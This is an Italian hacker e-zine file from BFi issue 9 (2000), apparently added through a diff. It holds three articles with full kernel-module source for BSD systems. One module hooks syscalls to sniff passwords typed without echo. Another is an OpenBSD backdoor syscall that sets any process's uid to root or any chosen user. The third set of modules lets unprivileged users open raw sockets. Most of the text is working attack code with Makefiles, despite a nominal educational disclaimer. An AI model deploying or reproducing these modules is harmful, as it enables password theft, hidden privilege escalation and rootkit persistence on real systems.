@@ -1,0 +1,970 @@
+==============================================================================
+-------------[ BFi numero 9, anno 3 - 03/11/2000 - file 8 di 21 ]-------------
+==============================================================================
+
+
+-[ THREADS ]------------------------------------------------------------------
+---[ VARi
+
+
+---[ iNTERCETTAZi0NE DELLE PASSW0RD iNSERiTE SENZA TERMiNAL		vecna
+     ECH0 ViA KLD
+---[ OpenBSD: THC BACKDOOR 						pIGpEN
+---[ RAW SOCKETS 4 ALL (FreeBSD 4.x, OpenBSD 2.7)			pIGpEN
+
+
+--[ iNTERCETTAZi0NE DELLE PASSW0RD iNSERiTE SENZA TERMiNAL ECH0 ViA KLD
+---[ vecna <vecna@s0ftpj.org>
+
+Articolo piccolo piccolo, ma che mi e` piaciuto scrivere. Tutto e` nato cosi`:
+
+alle 10:20 di stamattina sono tornato a casa, dopo esser stato dall'ortolano,
+e mi sono messo a programmare l'idea avuta a colazione;
+alle 10:55 spengo il pc e corro fuori per non perdere il treno;
+alle 21:00 ho ripreso mentre guardavo i cartoni su MTv;
+alle 21:40 circa mi sono stancato;
+alle 24:00 ho ripreso;
+ora e` l'1:02 e inizio a scrivere cos'e` sta` porcheria, dopo una consulenza
+via irc con LordFelix, e gli ultimi ritocchi.
+
+Il funzionamento della getpass(3) e` semplice: leva dal terminale l'echo
+locale in modo che l'utente possa scrivere la sua password senza che
+essa venga visualizzata; per levare l'echo e` molto comodo usare la 
+funzione tcsetattr definita nella libreria termios.h .
+
+Un esempio che ho visto molto esplicativo e`:
+
+	#include <stdlib.h>
+	#include <stdio.h>
+
+	#include <termios.h>
+	#include <string.h>
+
+	static struct termios stored_settings;
+
+	void echo_off(void)
+	{
+		struct termios new_settings;
+		tcgetattr(0,&stored_settings);
+		new_settings = stored_settings;
+		new_settings.c_lflag &= (~ECHO);
+		tcsetattr(0,TCSANOW,&new_settings);
+		return;
+	}
+
+	void echo_on(void)
+	{
+		tcsetattr(0,TCSANOW,&stored_settings);
+		return;
+	}
+
+Per maggiori informazioni sulle potenzialita` della tcsetattr consultate
+le man page tcsetattr(3) e termios(3).
+
+Se usiamo strace (Linux) o ktrace (FreeBSD) vediamo che la tcsetattr non e`
+altro che un wrapper alla ioctl(2).
+
+QUINDI, se noi via LKM/KLD dirottiamo la ioctl() su una nostra funzione
+possiamo capire se si sta` tentando di manipolare il terminale (grazie
+al secondo argomento passato a ioctl) e possiamo ottenere maggiori
+informazioni facendo un opportuno cast e leggendoci la struttura dati
+opzionale passata come terzo argomento.
+
+Con ktrace di un programmino come:
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+	{
+	char *pass =malloc(128);
+	pass =getpass("metti una pass che la intercetto :");
+	return(EXIT_SUCCESS);
+	}
+
+vediamo:
+
+   301 progra1  CALL  sigprocmask(0x1,0x28060040,0x28060050)
+   301 progra1  RET   sigprocmask 0
+   301 progra1  CALL  sigprocmask(0x3,0x28060050,0)
+   301 progra1  RET   sigprocmask 0
+   301 progra1  CALL  ioctl(0x3,TIOCSETAF,0xbfbffbc4)
+   301 progra1  RET   ioctl 0
+
+Quindi via KLD, sapendo che la ioctl riceve come argomenti:
+
+struct proc *, 			(come classico)
+struct ioctl_args *		(definita in modo da tenere gli argomenti
+				 classici della ioctl(2) ):
+struct ioctl_args 
+	{
+	int fd;	
+	u_long com;
+	caddr_t data;
+	};
+
+ci basta checkare struct->com che sia TIOCSETAF, poi fare un cast di una
+struct termios *, sull'indirizzo contentuno in struct->data e verificare 
+i flag selezionati e valutare quindi il reale intento della ioctl().
+
+Sotto Linux, tanto per completezza:
+
+ioctl(3, TCGETS, {B38400 opost -isig icanon -echo ...}) = 0
+
+       // <include/asm-i386/termios.h>
+       0x00005401  TCGETS            struct termios *
+       0x00005402  TCSETS            const struct termios *
+       0x00005403  TCSETSW           const struct termios *
+       0x00005404  TCSETSF           const struct termios *
+
+dalla man page ioctl_list(2).
+
+Questo e` il kld per FreeBSD, fatto su FreeBSD 4.0 (tnx naif che in 3 giorni
+mi ha masterizzato 4 cd diversi :) bei tempi quando lavoravamo :)
+Putroppo non sapevo che nome dargli, chiedendo consglio a mia mamma ho
+ottenuto come proposte solo "pippo" o "rain"... visto che e` da 4 giorni che
+vado in giro  con l'ombrello e visto che sono italiano, questo kld ha preso
+il nome di "piove".
+
+<-| piove/piove.c |->
+/* 
+ * KLD by vecna@s0ftpj.org for FreeBSD 4.0 
+ * This module shows how to intercept getpass(3) function and print anything
+ * that is typed without terminal echo.
+ * Sorry for my english, I like only milanese.
+ */
+
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/syscall.h>
+#include <sys/sysent.h>
+#include <sys/sysproto.h>
+#include <sys/linker.h>
+#include <sys/ttycom.h>
+
+#include <termios.h>
+
+static int procnum;
+
+static int piove_ioctl(struct proc *p, struct ioctl_args *uap)
+	{
+	if(uap->com == TIOCSETAF)
+		{
+		struct termios *check;
+
+		check =(struct termios *) uap->data;
+		/* tnx to LordFelix :) */
+		if(!(check->c_lflag & ECHO))
+			procnum =p->p_pid;
+		}
+
+	return ioctl(p, uap);
+	}
+
+static int piove_read(struct proc *p, struct read_args *uap)
+	{
+	int ret;
+
+	ret =read(p, uap);
+
+	if(procnum)
+		if(p->p_pid == procnum)
+			{
+			char *charptr =uap->buf;
+			charptr[p->p_retval[0]] =0x00;
+
+			/* example of reading password, is nice log on
+			 * defined file, but this kld is only proof of
+			 * concet :) 
+			 */
+			uprintf("pid [%d] on terminal without echo [%s]\n",
+				procnum, charptr);
+			procnum = 0;
+			}
+
+	return ret;
+	}
+
+static struct sysent piove[2] = 
+	{
+	{ 3, (sy_call_t *) piove_read  },
+	{ 3, (sy_call_t *) piove_ioctl }
+	};
+
+static int init_module(module_t mod, int cmd, void *arg)
+	{
+        int ret = 0;
+
+        switch (cmd) 
+		{
+		case MOD_LOAD:
+			sysent[SYS_read] =piove[0];
+			sysent[SYS_ioctl] =piove[1];
+			uprintf(" getpass(3) kernel sniffer loaded\n");
+			break;
+		case MOD_UNLOAD:
+			sysent[SYS_read].sy_call =(sy_call_t *)read;
+			sysent[SYS_ioctl].sy_call =(sy_call_t *)ioctl;
+			uprintf(" piove kld unloaded\n");
+			break;
+		default:
+			ret = EINVAL;
+			break;
+		}
+        return(ret);
+	}
+
+static struct moduledata piove_moddata =
+	{
+	"piove",
+	init_module,
+	NULL
+	};
+
+DECLARE_MODULE(syscall, piove_moddata, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+<-X->
+
+tnx to: pIGpEN, bhe, io sono gia` al secondo kld in 5 giorni e 6 giorni fa`
+        non avevo ancora chiaro cosa fosse una sysent, e` anche merito dei
+	tuoi consigli & dei tuoi articoli
+	THC - Attacking FreeBSD with Kernel Modules - pragmatic
+
+Il modulo per ora non fa` altro che sparare il pid del processo e la password
+in console, non logga su file ne` fa` altro, l'unica cosa che mi interessava
+era indicare come leggere le password inserite in quel modo (e lo fa` sia
+login, pgp/gpg, su e tutti gli altri sistemi che via console fanno sparire
+l'echo) e direi che per essere 3 ore di lavoro sono abbastanza soddisfatto.
+
+Per compilare il modulo si usa il classico makefile per i moduli fbsd:
+
+<-| piove/Makefile |->
+SRCS    = piove.c
+KMOD    = piove
+KO      = ${KMOD}.ko
+KLDMOD  = t
+
+.include <bsd.kmod.mk>
+<-X->
+
+Ogni giudizio cattivo, miglioria, consigli e report di kernel panic possono
+essere inviati a vecna@s0ftpj.org, rispondero` volentieri perche` ultimamente
+non ricevo mai una mail :)
+
+ore 1:31 - fine, pufff :) 
+
+
+-[ OpenBSD: THC BACKD00R
+--[ pIGpEN <pigpen@s0ftpj.org>
+
+	Il seguente codice e' il porting di una backdoor semplice, ma
+	raffinata...
+
+	No, l'idea non e' mia :) i crediti vanno a pragmatic / THC anche se
+	e' facile che sia passata pure nella mente di molte altre persone...
+	Se non altro lui e' stato quello che l'ha codata :) per FreeBSD
+	vediamo come funziona il porting su OpenBSD...
+
+	# make 
+	# make load
+
+	$ ps aux | grep vim
+	pigpen   27318  0.0  6.8   884  1644 C3  I+     5:53PM    0:00.16 vim
+
+	$ ./call 27318 0
+	$ ps aux | grep vim
+	root     27318  0.0  6.8   884  1644 C3  I+     5:53PM    0:00.16 vim
+
+	Ops! Con quel processo possiamo ora scrivere su qualsiasi file :O
+
+	$ ./call 27318 1001
+	$ ps aux | grep vim
+	deadhead 27318  0.0  6.8   884  1644 C3  I+     5:53PM    0:00.16 vim
+
+	Ops! Il processo sara' a carico di deadhead :)
+
+	Come funziona?
+
+	Introducendo una nuova syscall che va a modificare i permessi sul
+	processo...
+
+	A differenza del src x fbsd di pragmatic, questo lkm permette di 
+	scegliere l'uid in modo che un processo possa essere eseguito anche
+	con permessi diversi da root...
+
+<-| obsd_back/thc_back.c crc32: 1515909354 |->
+/*
+ * Name: OpenBSD backdoor
+ * Date: Thu Jun 01 14:46:37 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * idea & credits go to pragmatic / THC 
+ * 				 "Attacking FreeBSD with Kernel Modules"
+ *
+ * OpenBSD porting by	pIGpEN / s0ftpj
+ *
+ *
+ * SoftProject Digital Security for Y2K (www.s0ftpj.org)
+ * Sikurezza.org Italian Security MailingList (www.sikurezza.org)
+ *
+ * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+ * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+ *
+ * Tested on: OpenBSD 2.6 FRACTAL#1 i386
+ * 
+ * This is a simple but useful backdoor for OpenBSD based on a FreeBSD lkm
+ * by pragmatic/THC you can read his paper: "Attacking FreeBSD with Kernel
+ * Modules" to understand how to implement it also on a OpenBSD kernel...     
+ *
+ * Greetings to: bozo(iKX), koba (sikurezza.org), pragmatic (THC) for his
+ * 		 work
+ *
+ * Consider this an example of lkm... don't use it!
+ * I didn't cover the module because it must be considered only for 
+ * educational purposes 
+ */
+
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/syscall.h>
+#include <sys/mount.h>
+#include <sys/conf.h>
+#include <sys/syscallargs.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/file.h>
+#include <sys/filedesc.h>
+#include <sys/errno.h>
+#include <sys/proc.h>
+
+#define OFFSET	210
+
+struct you_make_me_real_args {
+	syscallarg(int) p_pid;	/* process to make with p_real uid */
+	syscallarg(int) p_real;	/* p_real uid */
+};
+			   			  
+static int
+you_make_me_real (struct proc *p, void *v, register_t *retval) 
+{	
+	struct you_make_me_real_args *uap = v;
+	struct proc *pr;
+
+	if((pr = pfind(SCARG(uap, p_pid))) == NULL)
+		return (ESRCH);
+	
+	pr->p_cred->pc_ucred->cr_uid = SCARG(uap, p_real);
+	
+	return 0;
+}
+
+static struct sysent you_make_me_real_sysent = {
+	2,
+	sizeof(struct you_make_me_real_args),
+	you_make_me_real
+};
+
+MOD_SYSCALL( "thc_bck", OFFSET, &you_make_me_real_sysent);
+
+int
+thc_bck (struct lkm_table *lkmtp, int cmd, int ver)
+{
+	DISPATCH(lkmtp, cmd, ver, lkm_nofunc, lkm_nofunc, lkm_nofunc)
+}
+<-X->
+
+<-| obsd_back/Makefile crc32: 2707935197 |->
+SRCS=thc_back.c
+OBJS=$(SRCS:.c=.o)
+
+MODOBJ=bck.o
+
+KMOD=thc_bck
+CFLAGS+= -Wall -D_KERNEL -I/sys
+
+all:	$(MODOBJ)
+
+clean:
+	rm -f $(OBJS) $(KOBJS) $(MODOBJ) $(KMOD)
+
+load:
+	modload -o $(KMOD) -e$(KMOD) $(MODOBJ)
+
+unload:
+	modunload -n $(KMOD)
+
+$(MODOBJ): $(OBJS) $(KOBJS)
+	$(LD) -r -o $(MODOBJ) $(OBJS) $(KOBJS)
+<-X->
+
+<-| obsd_back/call.c crc32: 1088581707 |->
+/*
+ * an example to interface our syscall
+ */
+
+#include <stdio.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+#define OFFSET 210
+
+int
+main(int argc, char **argv)
+{
+	int error;
+
+	if(argc != 3) {
+		printf("Usage:\n%s pid uid\n", argv[0]);
+		exit(1);
+	}
+	
+	error = syscall(OFFSET, atoi(argv[1]), atoi(argv[2]));
+
+	if(error)
+		perror("syscall()");
+
+	return 0;
+}
+<-X->
+
+
+-[ RAW S0CKETS 4 ALL ( FreeBSD 4.x, OpenBSD 2.7 )
+--[ pIGpEN <pigpen@s0ftpj.org> 
+
+Questo e' il codice di sraw per le versioni 4.x di FreeBSD e di OpenBSD...
+Nella 4.x di FreeBSD niente di nuovo come FreeBSD 3.x e NetBSD il controllo
+viene fatto tramite suser(): precedentemente (nelle 2.x) i permessi erano
+controllati tramite SS_PRIV nella struttura socket attraverso so_state
+(questo e' quanto viene fatto attualmente pure da altri kernel BSD come
+OpenBSD, BSDI...)
+
+Il codice per la so_state e' qualcosa di simile al seguente:
+
+rip_usrreq()	
+/* gestione dei PRU_* state tramite funzione tipica di quasi tutti i 
+   kernel BSD (FreeBSD e' l'eccezione) */
+{
+	switch(richiesta) {
+		case PRU_ATTACH:
+				...
+				if((so->so_state & SS_PRIV)==0) {
+					...
+					return EACCES;
+				}
+				.. allocazione inpcb ecc...
+				break;
+		....altre PRU_*...
+	}
+	...
+}
+
+Per quanto riguarda FreeBSD aggiungo due cenni sulla suser():
+
+questa funzione e' diversa dalla 3.x, richiede solo il processo come potete 
+vedere da suser(9).
+
+Guardando poi kern/kern_prot.c:
+
+int
+suser(p)
+struct proc *p;
+{
+	return suser_xxx(0, p, 0); 
+	/* controlla i permessi ritornando EPERM nel caso in cui questi
+	   non siano adeguati */
+}
+
+Nella compilazione del seguente codice ponete attenzione se avete IPSEC 
+nel kernel...
+
+<-| rawsocket/fbsd4-sock/sock4.c crc32: 1295344851 |->
+/*
+ * Date: Mon Jul 17 21:26:21 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * SoftProject 2000 - Digital Sekurity for Y2k
+ * Sikurezza.org    - Italian Security MailingList
+ *
+ * Tested on: FreeBSD 4.0-RELEASE FreeBSD 4.0-RELEASE #26: Thu Ju i386
+ *
+ * All users are allowed to open raw sockets...
+ * This kld disables EPERM in socket() and permits to allocate inpcb even if
+ * the socket is raw and users haven't root permissions... bypassing suser()
+ * in pru_attach() functions...
+ *
+ * If the kernel is installed with IPSEC 
+ * #define IPSEC or you will have a kernel panic :)
+ * else undefine it ...
+ *
+ * Note: My English sucks :) (My Italian too :))
+ * 
+ * Idea & Code for Linux by Gigi_Sull
+ * Code for FreeBSD by pIGpEN / s0ftpj
+ */
+
+
+#include <sys/param.h>
+#include <sys/module.h>
+#include <sys/systm.h>
+#include <sys/kernel.h>
+#include <sys/protosw.h>
+#include <sys/socket.h>
+#include <sys/socketvar.h>
+
+#include <net/route.h>
+
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/in_pcb.h>
+#include <netinet/ip.h>
+#include <netinet/ip_var.h>
+
+#define IPSEC	/* see comments */
+
+extern struct protosw	inetsw[];
+extern struct inpcbinfo	ripcbinfo;
+
+
+static int rip_attach 		__P((struct socket *, int, struct proc *));
+static int (*old_rip_attach)	__P((struct socket *, int, struct proc *));
+static int module_handler	__P((module_t, int, void *));
+
+#define attach(x)	inetsw[ip_protox[x]].pr_usrreqs->pru_attach
+
+static int
+module_handler(module_t mod, int cmd, void *arg)
+{
+	int s;
+	
+	switch(cmd) {
+ 		case MOD_LOAD:
+			s = splnet();
+			old_rip_attach		=	attach(IPPROTO_RAW);
+	 		attach(IPPROTO_RAW)	=	rip_attach;
+			attach(IPPROTO_ICMP)	=	rip_attach;
+			attach(IPPROTO_IGMP)	= 	rip_attach;
+			attach(IPPROTO_RSVP)	=	rip_attach;
+			attach(IPPROTO_IPIP)	=	rip_attach;
+			attach(IPPROTO_IDP)	=	rip_attach;
+			attach(0)		=	rip_attach;
+			splx(s);
+			break;
+			
+		case MOD_UNLOAD:
+			s = splnet();
+			attach(IPPROTO_RAW)	=	old_rip_attach;
+			attach(IPPROTO_ICMP)	=	old_rip_attach;
+			attach(IPPROTO_IGMP)	=	old_rip_attach;
+			attach(IPPROTO_RSVP)	=	old_rip_attach;
+			attach(IPPROTO_IPIP)	=	old_rip_attach;
+			attach(IPPROTO_IDP)	=	old_rip_attach;
+			attach(0)		=	old_rip_attach;
+			splx(s);
+			break;
+	}
+	
+	return 0;
+}
+
+static moduledata_t s_raw = {
+	"S_Raw",
+	module_handler,
+	NULL
+};
+
+DECLARE_MODULE(S_Raw, s_raw, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+
+extern int rip_sendspace, rip_recvspace;
+	  
+static int
+rip_attach(struct socket *so, int proto, struct proc *p)
+{
+	struct inpcb *inp;
+	int error, s;
+
+	inp = sotoinpcb(so);
+	if (inp)
+		panic("rip_attach");
+	/*
+	 * if (p && (error = suser(p)) != 0)
+	 * 	return error;
+	 */
+
+	error = soreserve(so, rip_sendspace, rip_recvspace);
+	if (error)
+		return error;
+	s = splnet();
+	error = in_pcballoc(so, &ripcbinfo, p);
+	splx(s);
+	if (error)
+		return error;
+	inp = (struct inpcb *)so->so_pcb;
+	inp->inp_vflag |= INP_IPV4;
+	inp->inp_ip_p = proto;
+#ifdef IPSEC
+	error = ipsec_init_policy(so, &inp->inp_sp);
+	if (error != 0) {
+		in_pcbdetach(inp);
+		return error;
+	}
+#endif /*IPSEC*/
+	return 0;
+}
+<-X->
+
+<-| rawsocket/fbsd4-sock/Makefile crc32: 1422200088 |->
+# SoftProject 2000 - Digital Sekurity for Y2k
+# Sikurezza.org - Italian Security MailingList
+#
+# < pigpen@s0ftpj.org > 
+
+.PATH: /sys/kern
+SRCS	= sock4.c 
+CFLAGS+= -I/sys
+KMOD	= sock 
+NOMAN	= t
+KLDMOD	= t
+
+KLDLOAD		= /sbin/kldload
+KLDUNLOAD	= /sbin/kldunload
+
+CLEANFILES+= ${KMOD}
+
+load:
+	${KLDLOAD} -v ./${KMOD}
+
+unload:
+	${KLDUNLOAD} -v -n ${KMOD}
+
+.include <bsd.kmod.mk>
+<-X->
+
+<-| rawsocket/obsd-sock/obsd_sraw.c crc32: 3771710371 |->
+/*
+ * Name: SRaw for OpenBSD
+ * Date: Fri Jul 28 13:41:36 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * SoftProject Digital Security for Y2K (www.s0ftpj.org)
+ * Sikurezza.org Italian Security MailingList (www.sikurezza.org)
+ *
+ * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+ * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+ *
+ * Tested on: OpenBSD 2.7 FRACTAL#0 i386
+ *
+ * Giving all permission to open raw sockets...
+ *
+ * Supported Protocol for this SRaw:
+ * 
+ * IPPROTO_RAW, IPPROTO_ICMP, IPPROTO_IPIP, IPPROTO_IPV4, IPPROTO_IGMP
+ *
+ * Check if you have ipsec, mrouting on your kernel config and define it..
+ */
+
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/protosw.h>
+
+#include <sys/mbuf.h>
+#include <sys/socket.h>
+#include <sys/socketvar.h>
+#include <net/if.h>
+#include <net/route.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/in_pcb.h>
+
+int	nopriv_rip_usrreq	__P((register struct socket *, int, 
+				     struct mbuf *, struct mbuf *, 
+				     struct mbuf *));
+
+extern int	rip_usrreq	__P((register struct socket *, int,
+				     struct mbuf *, struct mbuf *,
+				     struct mbuf *));
+
+extern struct protosw inetsw[];
+extern u_char ip_protox[];
+extern u_long rip_sendspace, rip_recvspace;
+extern struct inpcbtable rawcbtable;
+
+MOD_MISC("SRaw");
+
+static int
+SRaw_load(struct lkm_table *lkmtp, int cmd)
+{
+	if(cmd == LKM_E_LOAD) {
+		
+		int s;
+
+		printf("SRaw - 0.1 beta\n");
+		printf("sOftPj - Y2k\n");
+
+		/*
+		 * You can also add other protocols... with rip_usrreq or
+		 * chage other pr_usrreq
+		 */
+
+		s = splnet();
+		
+		inetsw[ip_protox[IPPROTO_RAW]].pr_usrreq = nopriv_rip_usrreq;
+		inetsw[ip_protox[IPPROTO_ICMP]].pr_usrreq = nopriv_rip_usrreq;
+		inetsw[ip_protox[IPPROTO_IPV4]].pr_usrreq = nopriv_rip_usrreq;
+		inetsw[ip_protox[IPPROTO_IPIP]].pr_usrreq = nopriv_rip_usrreq;
+		inetsw[ip_protox[IPPROTO_IGMP]].pr_usrreq = nopriv_rip_usrreq;
+
+		splx(s);
+	}
+
+	return 0;
+}
+
+
+static int
+SRaw_unload(struct lkm_table *lkmtp, int cmd)
+{
+	if(cmd == LKM_E_UNLOAD) {
+		int s;
+		
+		printf("SRaw - Unloaded\n");
+
+		s = splnet();
+		
+		inetsw[ip_protox[IPPROTO_RAW]].pr_usrreq = rip_usrreq;
+		inetsw[ip_protox[IPPROTO_ICMP]].pr_usrreq = rip_usrreq;
+		inetsw[ip_protox[IPPROTO_IPV4]].pr_usrreq = rip_usrreq;
+		inetsw[ip_protox[IPPROTO_IPIP]].pr_usrreq = rip_usrreq;
+		inetsw[ip_protox[IPPROTO_IGMP]].pr_usrreq = rip_usrreq;
+
+		splx(s);
+	}
+
+	return 0;
+}
+
+
+SRaw( lkmtp, cmd, ver)
+struct lkm_table	*lkmtp;	
+int			cmd;
+int			ver;
+{
+	DISPATCH(lkmtp, cmd, ver, SRaw_load, SRaw_unload, lkm_nofunc);
+}
+
+
+int
+nopriv_rip_usrreq(so, req, m, nam, control)
+	register struct socket *so;
+	int req;
+	struct mbuf *m, *nam, *control;
+{
+	register int error = 0;
+	register struct inpcb *inp = sotoinpcb(so);
+#ifdef MROUTING
+	extern struct socket *ip_mrouter;
+#endif
+	if (req == PRU_CONTROL)
+		return (in_control(so, (u_long)m, (caddr_t)nam,
+			(struct ifnet *)control));
+
+	if (inp == NULL && req != PRU_ATTACH) {
+		error = EINVAL;
+		goto release;
+	}
+
+	switch (req) {
+
+	case PRU_ATTACH:
+		if (inp)
+			panic("rip_attach");
+		/* 
+		 * if ((so->so_state & SS_PRIV) == 0) {
+		 *	error = EACCES;
+		 *	break;
+		 * }
+		 */
+
+		if((so->so_state & SS_PRIV) == 0)
+			so->so_state |= SS_PRIV;
+
+		
+		if ((error = soreserve(so, rip_sendspace, rip_recvspace)) ||
+		    (error = in_pcballoc(so, &rawcbtable)))
+			break;
+		inp = (struct inpcb *)so->so_pcb;
+		inp->inp_ip.ip_p = (long)nam;
+		break;
+
+	case PRU_DISCONNECT:
+		if ((so->so_state & SS_ISCONNECTED) == 0) {
+			error = ENOTCONN;
+			break;
+		}
+		/* FALLTHROUGH */
+	case PRU_ABORT:
+		soisdisconnected(so);
+		/* FALLTHROUGH */
+	case PRU_DETACH:
+		if (inp == 0)
+			panic("rip_detach");
+#ifdef MROUTING
+		if (so == ip_mrouter)
+			ip_mrouter_done();
+#endif
+		in_pcbdetach(inp);
+		break;
+
+	case PRU_BIND:
+	    {
+		struct sockaddr_in *addr = mtod(nam, struct sockaddr_in *);
+
+		if (nam->m_len != sizeof(*addr)) {
+			error = EINVAL;
+			break;
+		}
+		if ((ifnet.tqh_first == 0) ||
+		    ((addr->sin_family != AF_INET) &&
+		     (addr->sin_family != AF_IMPLINK)) ||
+		    (addr->sin_addr.s_addr &&
+		     ifa_ifwithaddr(sintosa(addr)) == 0)) {
+			error = EADDRNOTAVAIL;
+			break;
+		}
+		inp->inp_laddr = addr->sin_addr;
+		break;
+	    }
+	case PRU_CONNECT:
+	    {
+		struct sockaddr_in *addr = mtod(nam, struct sockaddr_in *);
+
+		if (nam->m_len != sizeof(*addr)) {
+			error = EINVAL;
+			break;
+		}
+		if (ifnet.tqh_first == 0) {
+			error = EADDRNOTAVAIL;
+			break;
+		}
+		if ((addr->sin_family != AF_INET) &&
+		     (addr->sin_family != AF_IMPLINK)) {
+			error = EAFNOSUPPORT;
+			break;
+		}
+		inp->inp_faddr = addr->sin_addr;
+		soisconnected(so);
+		break;
+	    }
+
+	case PRU_CONNECT2:
+		error = EOPNOTSUPP;
+		break;
+
+	/*
+	 * Mark the connection as being incapable of further input.
+	 */
+	case PRU_SHUTDOWN:
+		socantsendmore(so);
+		break;
+
+	/*
+	 * Ship a packet out.  The appropriate raw output
+	 * routine handles any massaging necessary.
+	 */
+	case PRU_SEND:
+	    {
+		register u_int32_t dst;
+
+		if (so->so_state & SS_ISCONNECTED) {
+			if (nam) {
+				error = EISCONN;
+				break;
+			}
+			dst = inp->inp_faddr.s_addr;
+		} else {
+			if (nam == NULL) {
+				error = ENOTCONN;
+				break;
+			}
+			dst = mtod(nam, struct sockaddr_in *)->sin_addr.s_addr;
+		}
+#ifdef IPSEC
+		if (!(error = check_ipsec_policy(inp, dst)))
+#endif
+		error = rip_output(m, so, dst);
+		m = NULL;
+		break;
+	    }
+
+	case PRU_SENSE:
+		/*
+		 * stat: don't bother with a blocksize.
+		 */
+		return (0);
+
+	/*
+	 * Not supported.
+	 */
+	case PRU_RCVOOB:
+	case PRU_RCVD:
+	case PRU_LISTEN:
+	case PRU_ACCEPT:
+	case PRU_SENDOOB:
+		error = EOPNOTSUPP;
+		break;
+
+	case PRU_SOCKADDR:
+		in_setsockaddr(inp, nam);
+		break;
+
+	case PRU_PEERADDR:
+		in_setpeeraddr(inp, nam);
+		break;
+
+	default:
+		panic("rip_usrreq");
+	}
+release:
+	if (m != NULL)
+		m_freem(m);
+	return (error);
+}
+<-X->
+
+<-| rawsocket/obsd-sock/Makefile crc32: 2086673923 |->
+SRCS=obsd_sraw.c
+OBJS=$(SRCS:.c=.o)
+
+MODOBJ=SRaw.o
+
+KMOD=SRaw
+CFLAGS+= -D_KERNEL -I/sys
+
+all:	$(MODOBJ)
+
+clean:
+	rm -f $(OBJS) $(KOBJS) $(MODOBJ) $(KMOD)
+
+load:
+	modload -o $(KMOD) -e$(KMOD) $(MODOBJ)
+
+unload:
+	modunload -n $(KMOD)
+
+$(MODOBJ): $(OBJS) $(KOBJS)
+	$(LD) -r -o $(MODOBJ) $(OBJS) $(KOBJS)
+<-X->
+
+
+==============================================================================
+---------------------------------[ EOF 8/21 ]---------------------------------
+==============================================================================
